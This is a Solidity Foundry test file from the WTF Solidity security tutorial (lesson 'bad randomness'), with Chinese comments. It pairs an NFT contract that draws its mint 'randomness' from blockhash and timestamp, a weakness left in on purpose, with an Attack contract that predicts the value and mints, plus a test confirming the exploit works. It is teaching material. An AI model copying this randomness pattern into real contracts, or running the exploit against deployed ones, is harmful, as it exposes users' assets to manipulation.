// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

/**
    WTF Solidity 合约安全: S07. 坏随机数

    ref https://www.wtf.academy/solidity-104/BadRandomness/

    command `forge test -vvv --contracts ./src/wtf/S07BadRandomness.sol`
 */
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

contract BadRandomness is ERC721 {
    uint256 totalSupply;

    // 构造函数，初始化NFT合集的名称、代号
    constructor() ERC721("", "") {}

    // 铸造函数：当输入的 luckyNumber 等于随机数时才能mint
    function luckyMint(uint256 luckyNumber) external {
        uint256 randomNumber = uint256(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
            )
        ) % 100; // get bad random number
        require(randomNumber == luckyNumber, "Better luck next time!");

        _mint(msg.sender, totalSupply); // mint
        totalSupply++;
    }
}

contract Attack {
    function attackMint(BadRandomness nftAddr) external {
        // 提前计算随机数
        uint256 luckyNumber = uint256(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
            )
        ) % 100;
        // 利用 luckyNumber 攻击
        nftAddr.luckyMint(luckyNumber);
    }
}

contract ContractTest is Test {
    function testBadRandomness() public {
        BadRandomness nftAddr = new BadRandomness();
        Attack attack = new Attack();
        attack.attackMint(nftAddr);
        assertEq(nftAddr.balanceOf(address(attack)), 1);
    }
}
